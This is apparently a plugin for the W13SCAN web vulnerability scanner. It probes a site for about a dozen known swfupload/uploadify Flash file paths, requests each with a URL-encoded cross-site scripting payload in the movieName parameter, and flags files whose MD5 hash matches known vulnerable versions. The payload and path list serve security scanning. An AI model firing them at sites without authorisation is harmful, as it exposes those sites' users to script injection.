#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/20 8:54 PM
# @Author  : w8ay
# @File    : flashxss.py

import requests

from W13SCAN.lib.common import md5
from W13SCAN.lib.const import Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    desc = '''一些flash xss'''
    name = 'some flash xss'
    level = Level.LOW

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        domain = "{}://{}/".format(p.scheme, p.netloc)
        FileList = [domain + 'common/swfupload/swfupload.swf', domain + 'adminsoft/js/swfupload.swf',
                    domain + 'statics/js/swfupload/swfupload.swf', domain + 'images/swfupload/swfupload.swf',
                    domain + 'js/upload/swfupload/swfupload.swf',
                    domain + 'addons/theme/stv1/_static/js/swfupload/swfupload.swf',
                    domain + 'admin/kindeditor/plugins/multiimage/images/swfupload.swf',
                    domain + 'includes/js/upload.swf', domain + 'js/swfupload/swfupload.swf',
                    domain + 'Plus/swfupload/swfupload/swfupload.swf',
                    domain + 'e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf',
                    domain + 'include/lib/js/uploadify/uploadify.swf', domain + 'lib/swf/swfupload.swf']

        md5_list = [
            '3a1c6cc728dddc258091a601f28a9c12',
            '53fef78841c3fae1ee992ae324a51620',
            '4c2fc69dc91c885837ce55d03493a5f5',
        ]

        for payload in FileList:
            payload1 = payload + "?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22xss%22%29}}//"
            r = requests.get(payload1, headers=headers)
            if r.status_code == 200:
                md5_value = md5(r.content)
                if md5_value in md5_list:
                    out.success(payload1, self.name)
